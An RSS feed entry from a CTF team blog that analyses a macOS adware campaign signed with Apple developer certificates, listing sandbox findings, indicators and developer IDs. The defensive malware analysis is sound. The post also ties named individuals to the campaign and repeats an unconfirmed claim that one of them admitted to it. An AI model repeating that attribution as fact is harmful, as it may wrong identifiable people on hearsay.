@@ -1,0 +1,983 @@
+<?xml version="1.0" encoding="UTF-8"?><rss version="2.0"
+	xmlns:content="http://purl.org/rss/1.0/modules/content/"
+	xmlns:wfw="http://wellformedweb.org/CommentAPI/"
+	xmlns:dc="http://purl.org/dc/elements/1.1/"
+	xmlns:atom="http://www.w3.org/2005/Atom"
+	xmlns:sy="http://purl.org/rss/1.0/modules/syndication/"
+	xmlns:slash="http://purl.org/rss/1.0/modules/slash/"
+	
+xmlns:georss="http://www.georss.org/georss" xmlns:geo="http://www.w3.org/2003/01/geo/wgs84_pos#"
+>
+
+<channel>
+	<title>Uncategorized &#8211; BabyPhD CTF Team</title>
+	<atom:link href="https://babyphd.net/category/uncategorized/feed/" rel="self" type="application/rss+xml" />
+	<link>https://babyphd.net</link>
+	<description>Nói chung đây là một khái niệm vô cùng trừu tượng</description>
+	<lastBuildDate>Thu, 07 Sep 2017 08:22:09 +0000</lastBuildDate>
+	<language>en-US</language>
+	<sy:updatePeriod>
+	hourly	</sy:updatePeriod>
+	<sy:updateFrequency>
+	1	</sy:updateFrequency>
+	<generator>https://wordpress.org/?v=5.2.2</generator>
+<site xmlns="com-wordpress:feed-additions:1">104079289</site>	<item>
+		<title>What is SafeFinder/OperatorMac campaign?</title>
+		<link>https://babyphd.net/2017/08/10/wtf-is-safefinderoperatormac-campaign/</link>
+				<pubDate>Thu, 10 Aug 2017 15:35:08 +0000</pubDate>
+		<dc:creator><![CDATA[phamus]]></dc:creator>
+				<category><![CDATA[chuymich]]></category>
+		<category><![CDATA[forensic]]></category>
+		<category><![CDATA[Uncategorized]]></category>
+		<category><![CDATA[vietnamese]]></category>
+		<category><![CDATA[malware]]></category>
+		<category><![CDATA[Mughthesec]]></category>
+		<category><![CDATA[OperatorMac]]></category>
+
+		<guid isPermaLink="false">https://babyphd.net/?p=687</guid>
+				<description><![CDATA[&#160; A new variant of adware was just discovered yesterday. It’s going viral on Twitter and other media, since they use valid Apple developer certificate to sign all packed samples. I’m quite overbusy these days but it got my interest when seeing the name stated in that certificate: “Quoc Thinh”, quite a unique Vietnamese name. &#8230; <a href="https://babyphd.net/2017/08/10/wtf-is-safefinderoperatormac-campaign/" class="more-link">Continue reading <span class="screen-reader-text">What is SafeFinder/OperatorMac campaign?</span> <span class="meta-nav">&#8594;</span></a>]]></description>
+								<content:encoded><![CDATA[<p>&nbsp;</p>
+<p>A new variant of adware was just discovered yesterday. It’s going viral on Twitter and other media, since they use valid Apple developer certificate to sign all packed samples. I’m quite overbusy these days but it got my interest when seeing the name stated in that certificate: “Quoc Thinh”, quite a unique Vietnamese name. So why not take a break from desperate thesis, toss adware in my lame automated MacOS analysis framework and see what our ‘countryman’ doing?</p>
+<p><span id="more-687"></span>The sample was first noticed by <em>Gavriel State</em>‏ on Aug 7, then <em>Thomas A Reed</em> – the Mac malware boss hunter from Malwarebytes - confirmed it relates to OperatorMac on the next day. I think you all know the famous Mac free security tools’ author: <em>Patrick Wardle</em>, wrote an amazing report on <a href="https://objective-see.com/blog/blog_0x20.html">objective-see.com</a> in Aug 9. So I’m not going too deep in reverse engineering - static analysis, just throw in my Grey-cuckoo framework and grab results. In case somebody doesn’t know, it’s my thesis project and and soon to be released right after my judgment day - defense (hopefully).</p>
+<p>From Patrick’s report we understand it’s an adware which installs lots of crabs. By default, cuckoo sandbox timeout is 120 sec. Let’s extend it a bit, 300 sec (5 min) would be enough.</p>
+<p id="jztOQbU"><a href="https://i1.wp.com/babyphd.net/wp-content/uploads/2017/08/img_598c71a4b4bf1.png?ssl=1"><img data-attachment-id="692" data-permalink="https://babyphd.net/2017/08/10/wtf-is-safefinderoperatormac-campaign/img_598c71a4b4bf1/" data-orig-file="https://i1.wp.com/babyphd.net/wp-content/uploads/2017/08/img_598c71a4b4bf1.png?fit=1892%2C1159&amp;ssl=1" data-orig-size="1892,1159" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="img_598c71a4b4bf1" data-image-description="" data-medium-file="https://i1.wp.com/babyphd.net/wp-content/uploads/2017/08/img_598c71a4b4bf1.png?fit=300%2C184&amp;ssl=1" data-large-file="https://i1.wp.com/babyphd.net/wp-content/uploads/2017/08/img_598c71a4b4bf1.png?fit=604%2C370&amp;ssl=1" class="alignnone size-full wp-image-692 " src="https://i1.wp.com/babyphd.net/wp-content/uploads/2017/08/img_598c71a4b4bf1.png?w=604&#038;ssl=1" alt="" srcset="https://i1.wp.com/babyphd.net/wp-content/uploads/2017/08/img_598c71a4b4bf1.png?w=1892&amp;ssl=1 1892w, https://i1.wp.com/babyphd.net/wp-content/uploads/2017/08/img_598c71a4b4bf1.png?resize=300%2C184&amp;ssl=1 300w, https://i1.wp.com/babyphd.net/wp-content/uploads/2017/08/img_598c71a4b4bf1.png?resize=768%2C470&amp;ssl=1 768w, https://i1.wp.com/babyphd.net/wp-content/uploads/2017/08/img_598c71a4b4bf1.png?resize=1024%2C627&amp;ssl=1 1024w, https://i1.wp.com/babyphd.net/wp-content/uploads/2017/08/img_598c71a4b4bf1.png?w=1208&amp;ssl=1 1208w, https://i1.wp.com/babyphd.net/wp-content/uploads/2017/08/img_598c71a4b4bf1.png?w=1812&amp;ssl=1 1812w" sizes="(max-width: 604px) 100vw, 604px" data-recalc-dims="1" /></a></p>
+<p>First result we got, that Apple developer ID “Quoc Thinh”, and he got his certificate revoked from Apple today by the way <img src="https://s.w.org/images/core/emoji/12.0.0-1/72x72/1f604.png" alt="😄" class="wp-smiley" style="height: 1em; max-height: 1em;" />.</p>
+<p><code>spctl -avv "Mughthesec-Player(dmg).dmg"<br />
+Mughthesec-Player(dmg).dmg: <strong>CSSMERR_TP_CERT_REVOKED</strong></code></p>
+<p>From captured screenshots, we can see what this adware apparently executes: Install Adobe flash and offer you a bunch of PUA (potential unwanted applications) – Booking, Advanced Mac Cleaner, SafeFinder Safari extension, and AdBlock (in some relevant samples that will be discussed later).</p>
+<p><a href="https://i1.wp.com/babyphd.net/wp-content/uploads/2017/08/Webp.net-gifmaker.gif?ssl=1"><img data-attachment-id="696" data-permalink="https://babyphd.net/2017/08/10/wtf-is-safefinderoperatormac-campaign/webp-net-gifmaker/" data-orig-file="https://i1.wp.com/babyphd.net/wp-content/uploads/2017/08/Webp.net-gifmaker.gif?fit=1390%2C869&amp;ssl=1" data-orig-size="1390,869" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="Webp.net-gifmaker" data-image-description="" data-medium-file="https://i1.wp.com/babyphd.net/wp-content/uploads/2017/08/Webp.net-gifmaker.gif?fit=300%2C188&amp;ssl=1" data-large-file="https://i1.wp.com/babyphd.net/wp-content/uploads/2017/08/Webp.net-gifmaker.gif?fit=604%2C378&amp;ssl=1" class="alignnone wp-image-696" src="https://i1.wp.com/babyphd.net/wp-content/uploads/2017/08/Webp.net-gifmaker.gif?resize=571%2C358&#038;ssl=1" alt="" width="571" height="358" srcset="https://i1.wp.com/babyphd.net/wp-content/uploads/2017/08/Webp.net-gifmaker.gif?resize=300%2C188&amp;ssl=1 300w, https://i1.wp.com/babyphd.net/wp-content/uploads/2017/08/Webp.net-gifmaker.gif?resize=768%2C480&amp;ssl=1 768w, https://i1.wp.com/babyphd.net/wp-content/uploads/2017/08/Webp.net-gifmaker.gif?resize=1024%2C640&amp;ssl=1 1024w, https://i1.wp.com/babyphd.net/wp-content/uploads/2017/08/Webp.net-gifmaker.gif?w=1208&amp;ssl=1 1208w" sizes="(max-width: 571px) 100vw, 571px" data-recalc-dims="1" /></a></p>
+<p>Behavioral analysis shows the packed DMG sample invoked a ‘mac’ binary, thereafter ‘Mughthesec’ with a persistence ‘I’ binary. Screenshots below already included other analysis variant of this campaign.</p>
+<p><a href="https://i1.wp.com/babyphd.net/wp-content/uploads/2017/08/img_598c722bde0a9.png?ssl=1"><img data-attachment-id="693" data-permalink="https://babyphd.net/2017/08/10/wtf-is-safefinderoperatormac-campaign/img_598c722bde0a9/" data-orig-file="https://i1.wp.com/babyphd.net/wp-content/uploads/2017/08/img_598c722bde0a9.png?fit=726%2C863&amp;ssl=1" data-orig-size="726,863" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="img_598c722bde0a9" data-image-description="" data-medium-file="https://i1.wp.com/babyphd.net/wp-content/uploads/2017/08/img_598c722bde0a9.png?fit=252%2C300&amp;ssl=1" data-large-file="https://i1.wp.com/babyphd.net/wp-content/uploads/2017/08/img_598c722bde0a9.png?fit=604%2C718&amp;ssl=1" class="alignnone wp-image-693 " src="https://i1.wp.com/babyphd.net/wp-content/uploads/2017/08/img_598c722bde0a9.png?resize=275%2C327&#038;ssl=1" alt="" width="275" height="327" srcset="https://i1.wp.com/babyphd.net/wp-content/uploads/2017/08/img_598c722bde0a9.png?w=726&amp;ssl=1 726w, https://i1.wp.com/babyphd.net/wp-content/uploads/2017/08/img_598c722bde0a9.png?resize=252%2C300&amp;ssl=1 252w" sizes="(max-width: 275px) 100vw, 275px" data-recalc-dims="1" /></a><a href="https://i0.wp.com/babyphd.net/wp-content/uploads/2017/08/img_598c72309c103.png?ssl=1"><img data-attachment-id="694" data-permalink="https://babyphd.net/2017/08/10/wtf-is-safefinderoperatormac-campaign/img_598c72309c103/" data-orig-file="https://i0.wp.com/babyphd.net/wp-content/uploads/2017/08/img_598c72309c103.png?fit=732%2C1051&amp;ssl=1" data-orig-size="732,1051" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="img_598c72309c103" data-image-description="" data-medium-file="https://i0.wp.com/babyphd.net/wp-content/uploads/2017/08/img_598c72309c103.png?fit=209%2C300&amp;ssl=1" data-large-file="https://i0.wp.com/babyphd.net/wp-content/uploads/2017/08/img_598c72309c103.png?fit=604%2C867&amp;ssl=1" class="alignnone wp-image-694 " src="https://i0.wp.com/babyphd.net/wp-content/uploads/2017/08/img_598c72309c103.png?resize=224%2C322&#038;ssl=1" alt="" width="224" height="322" srcset="https://i0.wp.com/babyphd.net/wp-content/uploads/2017/08/img_598c72309c103.png?w=732&amp;ssl=1 732w, https://i0.wp.com/babyphd.net/wp-content/uploads/2017/08/img_598c72309c103.png?resize=209%2C300&amp;ssl=1 209w, https://i0.wp.com/babyphd.net/wp-content/uploads/2017/08/img_598c72309c103.png?resize=713%2C1024&amp;ssl=1 713w" sizes="(max-width: 224px) 100vw, 224px" data-recalc-dims="1" /></a><a href="https://i0.wp.com/babyphd.net/wp-content/uploads/2017/08/img_598c7244ef84c.png?ssl=1"><img data-attachment-id="695" data-permalink="https://babyphd.net/2017/08/10/wtf-is-safefinderoperatormac-campaign/img_598c7244ef84c/" data-orig-file="https://i0.wp.com/babyphd.net/wp-content/uploads/2017/08/img_598c7244ef84c.png?fit=917%2C1413&amp;ssl=1" data-orig-size="917,1413" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="img_598c7244ef84c" data-image-description="" data-medium-file="https://i0.wp.com/babyphd.net/wp-content/uploads/2017/08/img_598c7244ef84c.png?fit=195%2C300&amp;ssl=1" data-large-file="https://i0.wp.com/babyphd.net/wp-content/uploads/2017/08/img_598c7244ef84c.png?fit=604%2C930&amp;ssl=1" class="alignnone wp-image-695 " src="https://i0.wp.com/babyphd.net/wp-content/uploads/2017/08/img_598c7244ef84c.png?resize=297%2C458&#038;ssl=1" alt="" width="297" height="458" srcset="https://i0.wp.com/babyphd.net/wp-content/uploads/2017/08/img_598c7244ef84c.png?w=917&amp;ssl=1 917w, https://i0.wp.com/babyphd.net/wp-content/uploads/2017/08/img_598c7244ef84c.png?resize=195%2C300&amp;ssl=1 195w, https://i0.wp.com/babyphd.net/wp-content/uploads/2017/08/img_598c7244ef84c.png?resize=768%2C1183&amp;ssl=1 768w, https://i0.wp.com/babyphd.net/wp-content/uploads/2017/08/img_598c7244ef84c.png?resize=665%2C1024&amp;ssl=1 665w" sizes="(max-width: 297px) 100vw, 297px" data-recalc-dims="1" /></a></p>
+<p>Move on to the network DNS feature, we see a lot of queries and some domains look "suspicious". Their DNS servers mostly are pointed to Akamai so I suggest we rather use domain as IOC than IP address, which could be different from viewers location. Filtering system calls logs with some rules of mine, there is no evasion technique been found. It’s quite surprising because Virustotal behavioral analysis shows a shorter execution trace than mine, which usually means its environment was detected at some point and malware stop running. In Patrick’s report he said there might be MAC address verification to detect VM (VM MAC usually starts with ’00:xx’). Fortunately, my VM framework MAC address was modified long ago since my colleague Yorick Koster at Securify used same trick to abuse my lame framework (thanks Yorick). I should add new rule – “MAC address check” later.</p>
+<p id="zFlKkqi"><a href="https://i2.wp.com/babyphd.net/wp-content/uploads/2017/08/img_598c755999974.png?ssl=1" target="_blank" rel="noopener"><img data-attachment-id="698" data-permalink="https://babyphd.net/2017/08/10/wtf-is-safefinderoperatormac-campaign/img_598c755999974/" data-orig-file="https://i2.wp.com/babyphd.net/wp-content/uploads/2017/08/img_598c755999974.png?fit=1949%2C1982&amp;ssl=1" data-orig-size="1949,1982" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="img_598c755999974" data-image-description="" data-medium-file="https://i2.wp.com/babyphd.net/wp-content/uploads/2017/08/img_598c755999974.png?fit=295%2C300&amp;ssl=1" data-large-file="https://i2.wp.com/babyphd.net/wp-content/uploads/2017/08/img_598c755999974.png?fit=604%2C614&amp;ssl=1" class=" alignnone wp-image-698 " src="https://i2.wp.com/babyphd.net/wp-content/uploads/2017/08/img_598c755999974.png?resize=604%2C614&#038;ssl=1" alt="" width="604" height="614" srcset="https://i2.wp.com/babyphd.net/wp-content/uploads/2017/08/img_598c755999974.png?w=1949&amp;ssl=1 1949w, https://i2.wp.com/babyphd.net/wp-content/uploads/2017/08/img_598c755999974.png?resize=295%2C300&amp;ssl=1 295w, https://i2.wp.com/babyphd.net/wp-content/uploads/2017/08/img_598c755999974.png?resize=768%2C781&amp;ssl=1 768w, https://i2.wp.com/babyphd.net/wp-content/uploads/2017/08/img_598c755999974.png?resize=1007%2C1024&amp;ssl=1 1007w, https://i2.wp.com/babyphd.net/wp-content/uploads/2017/08/img_598c755999974.png?w=1208&amp;ssl=1 1208w, https://i2.wp.com/babyphd.net/wp-content/uploads/2017/08/img_598c755999974.png?w=1812&amp;ssl=1 1812w" sizes="(max-width: 604px) 100vw, 604px" data-recalc-dims="1" /></a></p>
+<p>Additionally instead of execve(), MacOS sandbox policy usually invokes processes using XPCProxy or launchd services. So we got several processes created with posix_spawn(): delete Safari, iBooks, Mail cache (likely Advanced Mac cleaner doing its job), install mentioned PUAs and we got some new IOCs.</p>
+<p id="daBSQQC"><a href="https://i2.wp.com/babyphd.net/wp-content/uploads/2017/08/img_598c75725dafc.png?ssl=1"><img data-attachment-id="699" data-permalink="https://babyphd.net/2017/08/10/wtf-is-safefinderoperatormac-campaign/img_598c75725dafc/" data-orig-file="https://i2.wp.com/babyphd.net/wp-content/uploads/2017/08/img_598c75725dafc.png?fit=1950%2C755&amp;ssl=1" data-orig-size="1950,755" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="img_598c75725dafc" data-image-description="" data-medium-file="https://i2.wp.com/babyphd.net/wp-content/uploads/2017/08/img_598c75725dafc.png?fit=300%2C116&amp;ssl=1" data-large-file="https://i2.wp.com/babyphd.net/wp-content/uploads/2017/08/img_598c75725dafc.png?fit=604%2C234&amp;ssl=1" class="alignnone wp-image-699 size-full" src="https://i2.wp.com/babyphd.net/wp-content/uploads/2017/08/img_598c75725dafc.png?resize=604%2C234&#038;ssl=1" alt="" width="604" height="234" srcset="https://i2.wp.com/babyphd.net/wp-content/uploads/2017/08/img_598c75725dafc.png?w=1950&amp;ssl=1 1950w, https://i2.wp.com/babyphd.net/wp-content/uploads/2017/08/img_598c75725dafc.png?resize=300%2C116&amp;ssl=1 300w, https://i2.wp.com/babyphd.net/wp-content/uploads/2017/08/img_598c75725dafc.png?resize=768%2C297&amp;ssl=1 768w, https://i2.wp.com/babyphd.net/wp-content/uploads/2017/08/img_598c75725dafc.png?resize=1024%2C396&amp;ssl=1 1024w, https://i2.wp.com/babyphd.net/wp-content/uploads/2017/08/img_598c75725dafc.png?w=1208&amp;ssl=1 1208w, https://i2.wp.com/babyphd.net/wp-content/uploads/2017/08/img_598c75725dafc.png?w=1812&amp;ssl=1 1812w" sizes="(max-width: 604px) 100vw, 604px" data-recalc-dims="1" /></a></p>
+<p>Other great things from Cuckoo sandbox are Network analysis and Dropped files. However previous report detailed it well enough, hence only some screenshots from these features will be showed:</p>
+<style>.gist table { margin-bottom: 0; }</style><div class="gist-oembed" data-gist="0f0a61788ffe53be1f1a08be33150962.json"></div>
+<style>.gist table { margin-bottom: 0; }</style><div class="gist-oembed" data-gist="1830a8eb98f5ba755f1947386f7f93a0.json"></div>
+<p>Some dropped binaries like AMCleaner (93dd0c34a4ec25a508cd6d5fb86d8ccc0c318238d9fee0c93342a20759bf9b7e) already marked as malicious on VirusTotal (VT) 7/56, which could be an indication for vigilant users.</p>
+<p>Also with some fancy nonsense statistic screenshots, intent to scare analyst (:p)</p>
+<p id="MQRWKqm"><a href="https://i0.wp.com/babyphd.net/wp-content/uploads/2017/08/img_598c7796efc07.png?ssl=1"><img data-attachment-id="702" data-permalink="https://babyphd.net/2017/08/10/wtf-is-safefinderoperatormac-campaign/img_598c7796efc07/" data-orig-file="https://i0.wp.com/babyphd.net/wp-content/uploads/2017/08/img_598c7796efc07.png?fit=1950%2C987&amp;ssl=1" data-orig-size="1950,987" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="img_598c7796efc07" data-image-description="" data-medium-file="https://i0.wp.com/babyphd.net/wp-content/uploads/2017/08/img_598c7796efc07.png?fit=300%2C152&amp;ssl=1" data-large-file="https://i0.wp.com/babyphd.net/wp-content/uploads/2017/08/img_598c7796efc07.png?fit=604%2C306&amp;ssl=1" class="alignnone size-full wp-image-702 " src="https://i0.wp.com/babyphd.net/wp-content/uploads/2017/08/img_598c7796efc07.png?w=604&#038;ssl=1" alt="" srcset="https://i0.wp.com/babyphd.net/wp-content/uploads/2017/08/img_598c7796efc07.png?w=1950&amp;ssl=1 1950w, https://i0.wp.com/babyphd.net/wp-content/uploads/2017/08/img_598c7796efc07.png?resize=300%2C152&amp;ssl=1 300w, https://i0.wp.com/babyphd.net/wp-content/uploads/2017/08/img_598c7796efc07.png?resize=768%2C389&amp;ssl=1 768w, https://i0.wp.com/babyphd.net/wp-content/uploads/2017/08/img_598c7796efc07.png?resize=1024%2C518&amp;ssl=1 1024w, https://i0.wp.com/babyphd.net/wp-content/uploads/2017/08/img_598c7796efc07.png?w=1208&amp;ssl=1 1208w, https://i0.wp.com/babyphd.net/wp-content/uploads/2017/08/img_598c7796efc07.png?w=1812&amp;ssl=1 1812w" sizes="(max-width: 604px) 100vw, 604px" data-recalc-dims="1" /></a></p>
+<p id="WVLWtXn"><a href="https://i0.wp.com/babyphd.net/wp-content/uploads/2017/08/img_598c779ebc535.png?ssl=1"><img data-attachment-id="703" data-permalink="https://babyphd.net/2017/08/10/wtf-is-safefinderoperatormac-campaign/img_598c779ebc535/" data-orig-file="https://i0.wp.com/babyphd.net/wp-content/uploads/2017/08/img_598c779ebc535.png?fit=1950%2C880&amp;ssl=1" data-orig-size="1950,880" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="img_598c779ebc535" data-image-description="" data-medium-file="https://i0.wp.com/babyphd.net/wp-content/uploads/2017/08/img_598c779ebc535.png?fit=300%2C135&amp;ssl=1" data-large-file="https://i0.wp.com/babyphd.net/wp-content/uploads/2017/08/img_598c779ebc535.png?fit=604%2C273&amp;ssl=1" class="alignnone size-full wp-image-703 " src="https://i0.wp.com/babyphd.net/wp-content/uploads/2017/08/img_598c779ebc535.png?w=604&#038;ssl=1" alt="" srcset="https://i0.wp.com/babyphd.net/wp-content/uploads/2017/08/img_598c779ebc535.png?w=1950&amp;ssl=1 1950w, https://i0.wp.com/babyphd.net/wp-content/uploads/2017/08/img_598c779ebc535.png?resize=300%2C135&amp;ssl=1 300w, https://i0.wp.com/babyphd.net/wp-content/uploads/2017/08/img_598c779ebc535.png?resize=768%2C347&amp;ssl=1 768w, https://i0.wp.com/babyphd.net/wp-content/uploads/2017/08/img_598c779ebc535.png?resize=1024%2C462&amp;ssl=1 1024w, https://i0.wp.com/babyphd.net/wp-content/uploads/2017/08/img_598c779ebc535.png?w=1208&amp;ssl=1 1208w, https://i0.wp.com/babyphd.net/wp-content/uploads/2017/08/img_598c779ebc535.png?w=1812&amp;ssl=1 1812w" sizes="(max-width: 604px) 100vw, 604px" data-recalc-dims="1" /></a></p>
+<p>At this moment, we have got all indicators to make behavioral detection rule and go hunting for other similar adware samples. Reason why I call this blog post – “a campaign”: there are numerous similar packed DMG/Mac apps matched ‘my behavioral rule’: fake Adobe Flash installer, lots of PUAs from subdomain name [cdn, dl, api] and Vietnamese developer certificate ID.</p>
+<p>&nbsp;</p>
+<table width="470">
+<tbody>
+<tr>
+<td width="107"><strong>Developer ID</strong></td>
+<td width="75"><strong>Number of Samples</strong></td>
+<td width="95"><strong>Detected (VT)</strong></td>
+<td width="92"><strong>Apple status</strong></td>
+<td width="101"><strong>First seen</strong></td>
+</tr>
+<tr>
+<td width="107">Quoc Thinh</p>
+<p>9G2J3967H9</p>
+<p>&nbsp;</td>
+<td width="75">6</td>
+<td width="95">1/6 (Ikarus detected 1 sample)</td>
+<td width="92">Revoked ID</td>
+<td width="101">2017-08-05</p>
+<p>&nbsp;</td>
+</tr>
+<tr>
+<td width="107">Pham Huong</p>
+<p>2BS26F3ZCP</td>
+<td width="75">7</td>
+<td width="95">0</td>
+<td width="92">Revoked ID</td>
+<td width="101">2017-07-15</td>
+</tr>
+<tr>
+<td width="107">Phan Anh</p>
+<p>C7J9SJ95GX</td>
+<td width="75">24</td>
+<td width="95">0</td>
+<td width="92">Valid</td>
+<td width="101">2017-04-13</td>
+</tr>
+<tr>
+<td width="107">Nhien Nguyen</td>
+<td width="75">3</td>
+<td width="95">1/3 (ESET-NOD32 detected 1 sample)</td>
+<td width="92">Valid</td>
+<td width="101">2017-08-09</p>
+<p>&nbsp;</td>
+</tr>
+<tr>
+<td width="107">Thanh Thuy WAA98JBA59</td>
+<td width="75">17</td>
+<td width="95">0</td>
+<td width="92">Valid</td>
+<td width="101">2017-07-06</p>
+<p>&nbsp;</td>
+</tr>
+<tr>
+<td width="107">Tran Phong GMFY4TULB3</td>
+<td width="75">6</td>
+<td width="95">0</td>
+<td width="92">Valid</td>
+<td width="101">2017-06-27</p>
+<p>&nbsp;</td>
+</tr>
+<tr>
+<td width="107">Minh Duc</p>
+<p>7CXE5FM69W</td>
+<td width="75">5</td>
+<td width="95">0</td>
+<td width="92">Valid</td>
+<td width="101">2017-06-21</td>
+</tr>
+<tr>
+<td width="107">Mai Linh</p>
+<p>M3XXTCHY66</td>
+<td width="75">3</td>
+<td width="95">0</td>
+<td width="92">Valid</td>
+<td width="101">2017-07-12</td>
+</tr>
+<tr>
+<td width="107"><strong><em>Total</em></strong></td>
+<td width="75"><em>71</em></td>
+<td width="95"><em>2 (3%)</em></td>
+<td width="92"><em>2/8 Revoked ID</em></td>
+<td width="101"><em>Staying undetected at least 4 months</em></td>
+</tr>
+</tbody>
+</table>
+<p>&nbsp;</p>
+<p>Please note that VT score is an indicator only, people usually fail to judge hardworking AVs by looking at VT score. We can never know if AV would detect those adwares live running whether or not. Also instead of Mughthesec, other adware use different loader names such as SearchWebSvc, TrustedSafeFinder, etc. I don’t think OSX/Mughthesec would be appropriate for the adware name. I suggest it would be OperatorMac because all campaign packages call a simple loader “mac” binary.</p>
+<p><strong>Conclusion</strong></p>
+<p>Be <strong>vigilant</strong>, no one needs Flash nowadays it’s dead. Apple Mac is not virus-free even with those fancy Apple protection XProtect, GateKeeper, Mac sandbox, code signing, etc, many security researchers already warned.</p>
+<p>It’s likely an affiliation advertising campaign, in which adware authors spent quite some money (~$800) for these 8 Apple developer certificates and only 2 of them are revoked. Some of dropped MachO executables are not signed, and we don’t know what if those can be really dangerous (like the unsigned MachO executable from APT32 Ocean Lotus campaign targeted Vietnamese organizations lately is really a sophisticated one). Based on timeline and periods of certificate registration, and money they have spent, I doubt these adware creators are making lots of money. Last, let me remind you some incidents happened recently and could be related to this campaign:</p>
+<ul>
+<li><a href="http://genk.vn/chuyen-gia-bao-mat-phat-hien-duong-day-chiem-doat-tai-khoan-ngan-hang-facebook-gmail-cuc-lon-o-viet-nam-ban-cung-co-the-la-nan-nhan-20170622230143671.chn">Malicious browser extension – fake IDM Downloader harvested around 5M cookies from popular websites, targeted Vietnamese netizens. </a></li>
+<li><a href="https://www.techsignin.com/tintuc/lua-dao-tu-viet-nam-kiem-hon-80-000-usdthang-tu-apple-store/">Fake App store AV app – making more than $80K per month. </a></li>
+</ul>
+<p><a href="https://twitter.com/phd_phuc">Phamus</a></p>
+<p><strong>P/S: </strong>I confronted one famous hacker in cyber pirate community – “Quoc Thinh” aka G4mm4, he seriously admitted he's behind the "crime". Not sure that’s true or he was just kidding <img src="https://s.w.org/images/core/emoji/12.0.0-1/72x72/1f60f.png" alt="😏" class="wp-smiley" style="height: 1em; max-height: 1em;" /></p>
